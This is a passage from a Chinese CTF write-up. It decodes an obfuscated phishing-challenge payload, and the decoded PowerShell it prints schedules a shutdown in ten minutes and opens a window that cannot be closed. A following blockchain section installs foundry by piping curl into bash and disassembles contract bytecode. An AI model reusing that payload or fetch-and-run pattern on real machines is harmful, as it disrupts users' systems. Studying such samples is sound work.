$u$u+$g$b$u$b+$g$b$b$o+$g$i$z+$g$b$b$x+$g$b$q$b+$g$b$u$i+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$e$u+$g$b$u$d+$g$b$q$u+$g$b$u$b+$g$b$u$u+$g$x$i+$g$b$u$d+$g$l$e+$g$b$u$i+$g$b$b$b+$g$b$u$z+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$x$x+$g$l$e+$g$l$l+$g$b$u$e+$g$x$e+$g$b$b$b+$g$b$u$i+$g$b$b$b+$g$b$b$o+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$z$d+$g$o$i+$g$o$i+$g$d$d+$g$d$d+$g$x$e+$g$x$e+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$e$e+$g$l$e+$g$b$q$u+$g$b$u$d+$g$b$u$l+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$x$x+$g$b$b$b+$g$b$q$u+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$e$u+$g$l$e+$g$b$u$i+$g$b$b$d+$g$b$u$b+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$i$o+$g$b$b$b+$g$b$b$q+$g$e$e+$g$b$b$b+$g$b$b$d+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$o+$g$b$b$o+$g$b$b$e+$g$b$u$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$b$u$q+$g$e$u+$g$o$l+$g$e$z+$g$x$d+$g$d$q+$g$d$e+$g$e$b+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$e$x+$g$e$z+$g$e$x+$g$x$e+$g$i$o+$g$e$u+$g$b$q$z+$g$d$o+$g$b$u$b+$g$l$d+$g$i$x+$g$o$l+$g$e$b+$g$b$u$i+$g$e$x+$g$d$q+$g$e$i+$g$d$d+$g$l$d+$g$d$q+$g$d$e+$g$x$o+$g$o$l+$g$e$i+$g$z$x+$g$b$b$x+$g$l$d+$g$b$b$q+$g$e$q+$g$e$z+$g$b$b$d+$g$b$u$o+$g$b$u$d+$g$b$b$u+$g$e$b+$g$b$q$d+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$b$u$q+$g$e$u+$g$o$l+$g$e$z+$g$x$d+$g$d$q+$g$d$e+$g$e$b+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$e$i+$g$o$i+$g$b$b$q+$g$b$u$b+$g$z$o+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$o$x+$g$i$o+$g$b$u$b+$g$b$q$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$d$i+$g$o$b+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$o$x+$g$e$x+$g$b$b$b+$g$l$l+$g$l$e+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$u+$g$b$b$b+$g$b$u$d+$g$b$b$u+$g$b$b$x+$g$o$u+$g$d$o+$g$d$q+$g$o$o+$g$z$q+$g$d$x+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$o$x+$g$x$d+$g$b$b$e+$g$b$b$x+$g$b$b$b+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$o+$g$b$b$o+$g$b$b$e+$g$b$u$b+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$b+$g$x$e+$g$b$b$b+$g$b$u$i+$g$b$b$b+$g$b$b$o+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$i$e+$g$b$u$o+$g$b$u$d+$g$b$b$x+$g$b$u$b+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$o$u+$g$z$o+$g$x$e+$g$b$b$b+$g$b$b$u+$g$b$b$d+$g$b$b$b+$g$b$u$i+$g$l$e+$g$b$b$d+$g$z$o+$g$o$o+$g$z$q+$g$d$o+$g$d$q+$g$o$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$o$x+$g$i$o+$g$b$u$b+$g$b$q$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$z$x$i$q$d+$g$z$e$z$q$o+$g$q$e$i$u$l+$g$q$x$z$e$e+$g$z$q+$g$b$u$q+$g$b$u$i+$g$l$e+$g$b$u$z+$g$x$d$z$u$e+$g$z$x$i$q$d+$g$q$u$u$b$u+$g$z$b$z$i$z+$g$q$b$o$e$d+$g$q$x$b$d$l+$g$q$o$d$l$u+$g$q$u$u$o$u+$g$q$u$l$i$x+$g$q$l$x$b$x+$g$z$u$z$o$u+$g$q$b$x$u$q+$g$x$d$q$l$q+$g$b$u$q+$g$b$u$i+$g$l$e+$g$b$u$z+$g$z$q+$g$q$z$x$u$b+$g$q$q$z$b$q+$g$z$e$u$q$e+$g$z$e$z$q$o+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$o$x+$g$e$x+$g$b$b$b+$g$l$l+$g$l$e+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$u+$g$b$b$b+$g$b$u$d+$g$b$b$u+$g$b$b$x+$g$o$u+$g$d$o+$g$d$q+$g$o$o+$g$z$q+$g$d$u+$g$d$q+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$o$x+$g$x$d+$g$b$b$e+$g$b$b$x+$g$b$b$b+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$o+$g$b$b$o+$g$b$b$e+$g$b$u$b+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$b+$g$x$e+$g$b$b$b+$g$b$u$i+$g$b$b$b+$g$b$b$o+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$i$e+$g$b$u$o+$g$b$u$d+$g$b$b$x+$g$b$u$b+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$o$u+$g$z$o+$g$q$o$o$l$o+$g$z$x$e$b$l+$g$z$i$d$l$e+$g$o$u$x$d$e+$g$z$o+$g$o$o+$g$z$q+$g$o$l+$g$d$o+$g$o$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$o$x+$g$i$o+$g$b$u$b+$g$b$q$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$q$u$z$q$u+$g$z$u$z$o$u+$g$z$u$u$u$d+$g$z$z$u$o$b+$g$q$z$d$d$i+$g$q$q$z$b$q+$g$z$q+$g$o$l+$g$o$i+$g$z$q+$g$q$u$l$l$i+$g$z$i$u$o$e+$g$q$b$d$b$i+$g$q$u$i$d$b+$g$q$x$o$q$x+$g$x$d$q$l$q+$g$z$d$i$z$b+$g$q$u$o$o$d+$g$q$z$z$i$o+$g$q$u$z$q$u+$g$z$u$z$o$u+$g$q$o$u$z$e+$g$q$u$z$b$x+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$o$x+$g$e$x+$g$b$b$b+$g$l$l+$g$l$e+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$i$u+$g$b$b$b+$g$b$u$d+$g$b$b$u+$g$b$b$x+$g$o$u+$g$d$o+$g$d$q+$g$o$o+$g$z$q+$g$d$b+$g$o$i+$g$o$i+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$o$x+$g$x$d+$g$b$b$e+$g$b$b$x+$g$b$b$b+$g$i$z+$g$b$u$d+$g$b$q$q+$g$b$u$b+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$o+$g$b$b$o+$g$b$b$e+$g$b$u$b+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$b+$g$x$e+$g$b$b$b+$g$b$u$i+$g$b$b$b+$g$b$b$o+$g$z$q+$g$x$b+$g$z$q+$g$z$o+$g$i$e+$g$b$u$o+$g$b$u$d+$g$b$b$x+$g$b$u$b+$g$z$o+$g$b$z+$g$b$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$z$q+$g$x$b+$g$z$q+$g$e$i+$g$b$u$b+$g$b$b$l+$g$o$d+$g$e$l+$g$l$i+$g$b$u$x+$g$b$u$b+$g$l$l+$g$b$b$x+$g$z$q+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$x$i+$g$b$b$o+$g$l$e+$g$b$b$l+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$o$u+$g$z$o+$g$q$o$o$l$o+$g$z$x$e$b$l+$g$z$i$d$l$e+$g$o$u$x$d$e+$g$z$o+$g$o$o+$g$z$q+$g$o$l+$g$d$o+$g$o$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$x$e+$g$b$b$b+$g$b$b$u+$g$b$b$x+$g$b$b$o+$g$b$b$b+$g$b$u$i+$g$b$b$d+$g$o$x+$g$x$d+$g$b$u$u+$g$b$u$u+$g$i$q+$g$l$e+$g$b$b$u+$g$b$u$z+$g$b$u$b+$g$o$u+$g$x$o+$g$o$u+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$o$l+$g$o$o+$g$z$q+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$u+$g$o$o+$g$z$q+$g$z$x+$g$e$x+$g$l$e+$g$l$i+$g$b$u$b+$g$b$u$i+$g$d$b+$g$o$b+$g$o$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$x$d+$g$b$u$u+$g$b$u$u+$g$l$d+$g$i$z+$g$b$u$o+$g$b$b$b+$g$b$b$l+$g$b$b$u+$g$o$u+$g$b$q$z+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$x$d+$g$l$l+$g$b$b$x+$g$b$u$d+$g$b$b$i+$g$l$e+$g$b$b$x+$g$b$u$b+$g$o$u+$g$o$b+$g$b$q$d+$g$o$b+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$x$d+$g$b$u$u+$g$b$u$u+$g$l$d+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$x$e+$g$b$u$i+$g$b$b$b+$g$b$b$d+$g$b$u$d+$g$b$b$u+$g$b$u$z+$g$o$u+$g$b$q$z+$g$b$z+$g$b$u+$g$z$q+$g$z$q+$g$z$q+$g$z$q+$g$z$x+$g$l$d+$g$o$x+$g$x$e+$g$l$e+$g$b$b$u+$g$l$l+$g$b$u$b+$g$b$u$i+$g$z$q+$g$x$b+$g$z$q+$g$z$x+$g$i$o+$g$b$b$o+$g$b$b$e+$g$b$u$b+$g$b$z+$g$b$u+$g$z$q+$g$z$q+$g$z$q+$g$z$q+$g$l$b+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$e+$g$b$u$b+$g$b$b$d+$g$b$b$d+$g$l$e+$g$b$u$z+$g$b$u$b+$g$x$x+$g$b$b$b+$g$b$q$u+$g$l$z+$g$d$i+$g$d$i+$g$i$z+$g$b$u$o+$g$b$b$b+$g$b$b$l+$g$o$u+$g$z$o+$g$b$l$l$i$b+$g$q$u$i$u$b+$g$z$d$e$x$i+$g$q$u$i$d$b+$g$z$i$z$i$b+$g$x$d$q$i$b+$g$z$o+$g$o$o+$g$z$q+$g$z$o+$g$q$d$d$d$q+$g$z$b$u$z$o+$g$z$o+$g$o$o+$g$z$q+$g$l$b+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$e+$g$b$u$b+$g$b$b$d+$g$b$b$d+$g$l$e+$g$b$u$z+$g$b$u$b+$g$x$x+$g$b$b$b+$g$b$q$u+$g$x$x+$g$b$b$e+$g$b$b$x+$g$b$b$x+$g$b$b$b+$g$b$b$u+$g$b$b$d+$g$l$z+$g$d$i+$g$d$i+$g$e$l+$g$e$d+$g$o$o+$g$z$q+$g$l$b+$g$i$z+$g$b$q$b+$g$b$b$d+$g$b$b$x+$g$b$u$b+$g$b$u$l+$g$o$x+$g$i$e+$g$b$u$d+$g$b$b$u+$g$b$u$u+$g$b$b$b+$g$b$b$l+$g$b$b$d+$g$o$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$b$b$d+$g$o$x+$g$e$e+$g$b$u$b+$g$b$b$d+$g$b$b$d+$g$l$e+$g$b$u$z+$g$b$u$b+$g$x$x+$g$b$b$b+$g$b$q$u+$g$e$z+$g$l$l+$g$b$b$b+$g$b$b$u+$g$l$z+$g$d$i+$g$d$i+$g$e$z+$g$b$b$u+$g$b$u$q+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$l$e+$g$b$b$x+$g$b$u$d+$g$b$b$b+$g$b$b$u+$g$o$b+$g$b$z+$g$b$u+$g$b$q$d+$g$o$b+$g$b$z+$g$b$u+$g$b$z+$g$b$u+$g$z$x+$g$e$u+$g$b$b$b+$g$b$b$o+$g$b$u$l+$g$o$x+$g$i$z+$g$b$u$o+$g$b$b$b+$g$b$b$l+$g$x$i+$g$b$u$d+$g$l$e+$g$b$u$i+$g$b$b$b+$g$b$u$z+$g$o$u+$g$o$b+$g$z$q+$g$b$q$o+$g$z$q+$g$e$l+$g$b$b$e+$g$b$b$x+$g$o$d+$g$e$i+$g$b$b$e+$g$b$u$i+$g$b$u$i"  # 最后一部分
)

# 分割并解码
tokens = encoded_str.split('+')
decoded_chars = []

for token in tokens:
    # 移除开头的"$g"并分割变量
    parts = token.replace('$g', '').split('$')[1:]
    # 拼接数字字符串
    num_str = ''.join(var_map[p] for p in parts if p in var_map)
    if num_str:
        # 转换为ASCII字符
        char_code = int(num_str)
        decoded_chars.append(chr(char_code))

# 输出结果
flag = ''.join(decoded_chars)
print(flag)
```

解析出下面内容，有flag `LILCTF{6e_V1GlL4N7_49@1N$t_pHIshinG}`

```powershell
$DebugPreference = $ErrorActionPreference = $VerbosePreference = $WarningPreference = "SilentlyContinue"

[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")

shutdown /s /t 600 >$Null 2>&1

$Form = New-Object System.Windows.Forms.Form
$Form.Text = "Ciallo～(∠·ω< )⌒★"
$Form.StartPosition = "Manual"
$Form.Location = New-Object System.Drawing.Point(40, 40)
$Form.Size = New-Object System.Drawing.Size(720, 480)
$Form.MinimalSize = New-Object System.Drawing.Size(720, 480)
$Form.MaximalSize = New-Object System.Drawing.Size(720, 480)
$Form.FormBorderStyle = "FixedDialog"
$Form.BackColor = "#0077CC"
$Form.MaximizeBox = $False
$Form.TopMost = $True


$fF1IA49G = "LILCTF{6e_V1GlL4N7_49@1N$t_pHIshinG}"
$fF1IA49G = "N0pe"


$Label1 = New-Object System.Windows.Forms.Label
$Label1.Text = ":)"
$Label1.Location = New-Object System.Drawing.Point(64, 80)
$Label1.AutoSize = $True
$Label1.ForeColor = "White"
$Label1.Font = New-Object System.Drawing.Font("Consolas", 64)

$Label2 = New-Object System.Windows.Forms.Label
$Label2.Text = "这里没有 flag；这个窗口是怎么出现的呢，flag 就在那里"
$Label2.Location = New-Object System.Drawing.Point(64, 240)
$Label2.AutoSize = $True
$Label2.ForeColor = "White"
$Label2.Font = New-Object System.Drawing.Font("微软雅黑", 16)

$Label3 = New-Object System.Windows.Forms.Label
$Label3.Text = "你的电脑将在 10 分钟后关机，请保存你的工作"
$Label3.Location = New-Object System.Drawing.Point(64, 300)
$Label3.AutoSize = $True
$Label3.ForeColor = "White"
$Label3.Font = New-Object System.Drawing.Font("微软雅黑", 16)

$Form.Controls.AddRange(@($Label1, $Label2, $Label3))

$Form.Add_Shown({$Form.Activate()})
$Form.Add_FormClosing({
    $_.Cancel = $True
    [System.Windows.Forms.MessageBox]::Show("不允许关闭！", "提示", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
})

$Form.ShowDialog() | Out-Null
```

## BlockChain

### **生蚝的宝藏**

先连接RPC、接水、部署合约一条龙，得到合约地址 `0x801C106775A116af3420358922fF10FeaA77119b`

因为没有给合约，所以只能从字节码反编译，装个 foundry

```bash
$ curl -L https://foundry.paradigm.xyz | bash
$ foundryup
```

获取一下字节码

```bash
$ cast code --rpc-url http://106.15.138.99:8545/ 0x801C106775A116af3420358922fF10FeaA77119b
0x608060405234801561001057600080fd5b50600436106100365760003560e01c80635cc4d8121461003b57806364d98f6e14610050575b600080fd5b61004e61004936600461023a565b61006a565b005b60015460ff16604051901515815260200160405180910390f35b61007381610112565b60405160200161008391906102eb565b6040516020818303038152906040528051906020012060006040516020016100ab9190610326565b60405160208183030381529060405280519060200120146101035760405162461bcd60e51b815260206004820152600e60248201526d57726f6e6720547265617375726560901b604482015260640160405180910390fd5b506001805460ff191681179055565b60408051808201909152600c81526b35b2bcaf9a9b9a1c19199ab360a11b60208201528151606091839160009067ffffffffffffffff81111561015757610157610224565b6040519080825280601f01601f191660200182016040528015610181576020820181803683370190505b50905060005b835181101561021b578283518261019e91906103c2565b815181106101ae576101ae6103e4565b602001015160f81c60f81b60f81c8482815181106101ce576101ce6103e4565b602001015160f81c60f81b60f81c1860f81b8282815181106101f2576101f26103e4565b60200101906001600160f81b031916908160001a90535080610213816103fa565b915050610187565b50949350505050565b634e487b7160e01b600052604160045260246000fd5b60006020828403121561024c57600080fd5b813567ffffffffffffffff8082111561026457600080fd5b818401915084601f83011261027857600080fd5b81358181111561028a5761028a610224565b604051601f8201601f19908116603f011681019083821181831017156102b2576102b2610224565b816040528281528760208487010111156102cb57600080fd5b826020860160208301376000928101602001929092525095945050505050565b6000825160005b8181101561030c57602081860181015185830152016102f2565b8181111561031b576000828501525b509190910192915050565b600080835481600182811c91508083168061034257607f831692505b602080841082141561036257634e487b7160e01b86526022600452602486fd5b8180156103765760018114610387576103b4565b60ff198616895284890196506103b4565b60008a81526020902060005b868110156103ac5781548b820152908501908301610393565b505084890196505b509498975050505050505050565b6000826103df57634e487b7160e01b600052601260045260246000fd5b500690565b634e487b7160e01b600052603260045260246000fd5b600060001982141561041c57634e487b7160e01b600052601160045260246000fd5b506001019056fea2646970667358221220d5c875e6de4319072b595bdd2382e9d4da7081fe0f1e58eb39dad3b70117693e64736f6c63430008090033
```

转换成操作码

```bash
$ cast code --rpc-url http://106.15.138.99:8545/ 0x801C106775A116af3420358922fF10FeaA77119b | cast disassemble
00000001: PUSH1 0x80
00000003: PUSH1 0x40
00000005: MSTORE
00000006: CALLVALUE
00000007: DUP1
00000008: ISZERO
00000009: PUSH2 0x0010
0000000c: JUMPI
0000000d: PUSH1 0x00
0000000f: DUP1
00000010: REVERT
00000011: JUMPDEST
00000012: POP
00000013: PUSH1 0x04
00000015: CALLDATASIZE
00000016: LT
00000017: PUSH2 0x0036
0000001a: JUMPI
0000001b: PUSH1 0x00
0000001d: CALLDATALOAD
0000001e: PUSH1 0xe0
00000020: SHR
00000021: DUP1
00000022: PUSH4 0x5cc4d812
00000027: EQ
00000028: PUSH2 0x003b
0000002b: JUMPI
0000002c: DUP1
0000002d: PUSH4 0x64d98f6e
00000032: EQ
00000033: PUSH2 0x0050
00000036: JUMPI
00000037: JUMPDEST
00000038: PUSH1 0x00
0000003a: DUP1
0000003b: REVERT
0000003c: JUMPDEST
0000003d: PUSH2 0x004e
00000040: PUSH2 0x0049
00000043: CALLDATASIZE
00000044: PUSH1 0x04
00000046: PUSH2 0x023a
00000049: JUMP
0000004a: JUMPDEST
0000004b: PUSH2 0x006a
0000004e: JUMP
0000004f: JUMPDEST
00000050: STOP
00000051: JUMPDEST
00000052: PUSH1 0x01
00000054: SLOAD
00000055: PUSH1 0xff
00000057: AND
00000058: PUSH1 0x40
0000005a: MLOAD
0000005b: SWAP1
0000005c: ISZERO
0000005d: ISZERO
0000005e: DUP2
0000005f: MSTORE
00000060: PUSH1 0x20
00000062: ADD
00000063: PUSH1 0x40
00000065: MLOAD
00000066: DUP1
00000067: SWAP2
00000068: SUB
00000069: SWAP1
0000006a: RETURN
0000006b: JUMPDEST
0000006c: PUSH2 0x0073
0000006f: DUP2
00000070: PUSH2 0x0112
00000073: JUMP
00000074: JUMPDEST
00000075: PUSH1 0x40
00000077: MLOAD
00000078: PUSH1 0x20
0000007a: ADD
0000007b: PUSH2 0x0083
0000007e: SWAP2
0000007f: SWAP1
00000080: PUSH2 0x02eb
00000083: JUMP
00000084: JUMPDEST
00000085: PUSH1 0x40
00000087: MLOAD
00000088: PUSH1 0x20
0000008a: DUP2
0000008b: DUP4
0000008c: SUB
0000008d: SUB
0000008e: DUP2
0000008f: MSTORE
00000090: SWAP1
00000091: PUSH1 0x40
00000093: MSTORE
00000094: DUP1
00000095: MLOAD
00000096: SWAP1
00000097: PUSH1 0x20
00000099: ADD
0000009a: KECCAK256
0000009b: PUSH1 0x00
0000009d: PUSH1 0x40
0000009f: MLOAD
000000a0: PUSH1 0x20
000000a2: ADD
000000a3: PUSH2 0x00ab
000000a6: SWAP2
000000a7: SWAP1
000000a8: PUSH2 0x0326
000000ab: JUMP
000000ac: JUMPDEST
000000ad: PUSH1 0x40
000000af: MLOAD
000000b0: PUSH1 0x20
000000b2: DUP2
000000b3: DUP4
000000b4: SUB
000000b5: SUB
000000b6: DUP2
000000b7: MSTORE
000000b8: SWAP1
000000b9: PUSH1 0x40
000000bb: MSTORE
000000bc: DUP1
000000bd: MLOAD
000000be: SWAP1
000000bf: PUSH1 0x20
000000c1: ADD
000000c2: KECCAK256
000000c3: EQ
000000c4: PUSH2 0x0103
000000c7: JUMPI
000000c8: PUSH1 0x40
000000ca: MLOAD
000000cb: PUSH3 0x461bcd
000000cf: PUSH1 0xe5
000000d1: SHL
000000d2: DUP2
000000d3: MSTORE
000000d4: PUSH1 0x20
000000d6: PUSH1 0x04
000000d8: DUP3
000000d9: ADD
000000da: MSTORE
000000db: PUSH1 0x0e
000000dd: PUSH1 0x24
000000df: DUP3
000000e0: ADD
000000e1: MSTORE
